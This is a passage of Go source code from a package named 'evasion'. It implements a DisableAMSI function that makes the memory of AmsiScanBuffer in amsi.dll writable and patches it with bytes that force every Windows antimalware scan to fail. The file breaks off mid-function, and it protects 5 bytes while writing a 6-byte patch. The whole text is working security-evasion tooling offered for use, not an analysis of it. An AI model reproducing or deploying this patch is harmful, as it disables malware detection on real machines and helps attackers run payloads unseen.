package evasion

import (
	"fmt"
	"os"
	"runtime"
	"syscall"
	"unsafe"
)

type EvasionHandler struct {
	techniques map[string]bool
}

func NewEvasionHandler() *EvasionHandler {
	return &EvasionHandler{
		techniques: make(map[string]bool),
	}
}

func (e *EvasionHandler) DisableAMSI() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("AMSI is Windows only")
	}

	amsi := syscall.NewLazyDLL("amsi.dll")
	amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualProtect := kernel32.NewProc("VirtualProtect")

	var oldProtect uint32
	addr := amsiScanBuffer.Addr()

	ret, _, _ := virtualProtect.Call(
		addr,
		uintptr(5),
		uintptr(0x40),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if ret == 0 {
		return fmt.Errorf("VirtualProtect failed")
	}

	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

